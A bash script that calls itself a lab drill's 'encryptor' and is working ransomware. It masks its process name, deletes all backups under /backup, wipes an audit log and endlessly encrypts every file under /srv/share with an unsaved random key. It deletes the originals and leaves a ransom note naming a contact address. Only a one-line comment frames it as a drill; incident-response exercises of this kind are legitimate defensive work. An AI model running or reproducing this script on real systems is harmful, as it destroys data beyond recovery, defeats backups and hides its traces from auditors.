#!/bin/bash
# The drill's "encryptor". Lab only.
exec -a lockerd bash -c '
key=$(head -c 32 /dev/urandom | base64)
note="All your files are encrypted. Contact restore@lumen-unlock.example with ID 7F3A-0921."
for b in /backup/*/*; do rm -f "$b" 2>/dev/null; done
: > /var/log/fs-audit.log
while :; do
  find /srv/share -type f ! -name "*.lmn" ! -name README_RESTORE_FILES.txt | while read -r f; do
    openssl enc -aes-256-cbc -pbkdf2 -pass "pass:$key" -in "$f" -out "$f.lmn" 2>/dev/null && rm -f "$f"
    echo "$note" > "$(dirname "$f")/README_RESTORE_FILES.txt"
  done
  sleep 5
done'
